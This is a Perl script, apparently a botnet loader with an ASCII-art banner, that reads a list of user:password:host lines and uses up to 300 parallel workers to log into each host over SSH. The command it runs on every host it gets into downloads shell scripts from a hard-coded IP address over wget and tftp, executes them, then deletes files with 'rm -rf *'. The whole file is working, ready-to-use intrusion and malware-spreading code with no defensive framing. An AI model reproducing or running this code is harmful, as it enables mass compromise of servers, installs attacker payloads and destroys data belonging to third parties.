#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __ __|                  _)       
#    |   __|  _` |   _` |  |   __| 
#    |  |    (   |  (   |  |  (    
#   _| _|   \__,_| \__, | _| \___| 
#                  |___/          
#
open(fh,'<', $ARGV[0]); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 slaves
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a slave
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /run || cd /; wget http://45.95.147.91/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 45.95.147.91 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 45.95.147.91; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\x1b[1;35m[\x1b[1;36mSSH\x1b[1;35m] \x1b[1;36mCommanding \x1b[1;35m->  \x1b[1;36m".$newarray[$c]."";
                } else {
                        print "\x1b[90mCan't Authenticate Host $newarray[$c]";
                }
        } else {
                print "\x1b[90mCant Connect To Host $newarray[$c]";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;